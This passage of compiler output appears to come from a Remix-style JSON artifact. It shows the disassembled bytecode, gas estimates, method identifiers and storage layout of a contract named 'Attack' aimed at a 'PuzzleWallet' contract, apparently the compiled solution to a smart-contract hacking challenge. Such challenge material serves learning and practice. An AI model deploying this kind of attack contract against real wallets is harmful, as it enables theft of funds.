DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x494 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x4A6 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x9D51D9B7 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x518 SWAP2 SWAP1 PUSH2 0x878 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x52F JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x541 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x58B PUSH2 0x586 PUSH2 0x581 DUP5 PUSH2 0x549 JUMP JUMPDEST PUSH2 0x568 JUMP JUMPDEST PUSH2 0x549 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x59C DUP3 PUSH2 0x571 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x5AD DUP3 PUSH2 0x592 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x5BD DUP2 PUSH2 0x5A3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x5D6 PUSH0 DUP4 ADD DUP5 PUSH2 0x5B4 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP2 DUP4 MCOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6A1 DUP3 PUSH2 0x65F JUMP JUMPDEST PUSH2 0x6AB DUP2 DUP6 PUSH2 0x669 JUMP JUMPDEST SWAP4 POP PUSH2 0x6BB DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x679 JUMP JUMPDEST PUSH2 0x6C4 DUP2 PUSH2 0x687 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x6DA DUP4 DUP4 PUSH2 0x697 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6F8 DUP3 PUSH2 0x636 JUMP JUMPDEST PUSH2 0x702 DUP2 DUP6 PUSH2 0x640 JUMP JUMPDEST SWAP4 POP DUP4 PUSH1 0x20 DUP3 MUL DUP6 ADD PUSH2 0x714 DUP6 PUSH2 0x650 JUMP JUMPDEST DUP1 PUSH0 JUMPDEST DUP6 DUP2 LT ISZERO PUSH2 0x74F JUMPI DUP5 DUP5 SUB DUP10 MSTORE DUP2 MLOAD PUSH2 0x730 DUP6 DUP3 PUSH2 0x6CF JUMP JUMPDEST SWAP5 POP PUSH2 0x73B DUP4 PUSH2 0x6E2 JUMP JUMPDEST SWAP3 POP PUSH1 0x20 DUP11 ADD SWAP10 POP POP PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH2 0x717 JUMP JUMPDEST POP DUP3 SWAP8 POP DUP8 SWAP6 POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x779 DUP2 DUP5 PUSH2 0x6EE JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x78B DUP3 PUSH2 0x549 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x79B DUP2 PUSH2 0x781 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x7B4 PUSH0 DUP4 ADD DUP5 PUSH2 0x792 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x7E6 PUSH2 0x7E1 PUSH2 0x7DC DUP5 PUSH2 0x7BA JUMP JUMPDEST PUSH2 0x568 JUMP JUMPDEST PUSH2 0x7C3 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x7F6 DUP2 PUSH2 0x7CC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH2 0x81A PUSH0 DUP4 PUSH2 0x7FC JUMP JUMPDEST SWAP2 POP PUSH2 0x825 DUP3 PUSH2 0x80C JUMP JUMPDEST PUSH0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x842 PUSH0 DUP4 ADD DUP6 PUSH2 0x792 JUMP JUMPDEST PUSH2 0x84F PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x7ED JUMP JUMPDEST DUP2 DUP2 SUB PUSH1 0x40 DUP4 ADD MSTORE PUSH2 0x860 DUP2 PUSH2 0x80F JUMP JUMPDEST SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH2 0x872 DUP2 PUSH2 0x7C3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x88B PUSH0 DUP4 ADD DUP5 PUSH2 0x869 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xCD 0xB8 0xA6 0xF8 0xF9 DUP13 0xF9 PUSH4 0x7CAEAD50 0xE2 0xC6 0xF6 EXTCODESIZE BLOCKHASH SWAP7 0xA6 CODESIZE RETURN RETURNDATASIZE 0xCC STOP PUSH14 0x34CCA0C6064D6564736F6C634300 ADDMOD BYTE STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "449400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "106",
						"run()": "infinite",
						"wallet()": "infinite"
					}
				},
				"methodIdentifiers": {
					"run()": "c0406226",
					"wallet()": "521eb273"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 297,
						"contract": "puzle_wallet_solve_2.sol:Attack",
						"label": "wallet",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(PuzzleWallet)290"
					}
				],
				"types": {
					"t_contract(PuzzleWallet)290": {
						"encoding": "inplace",
						"label": "contract PuzzleWallet",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}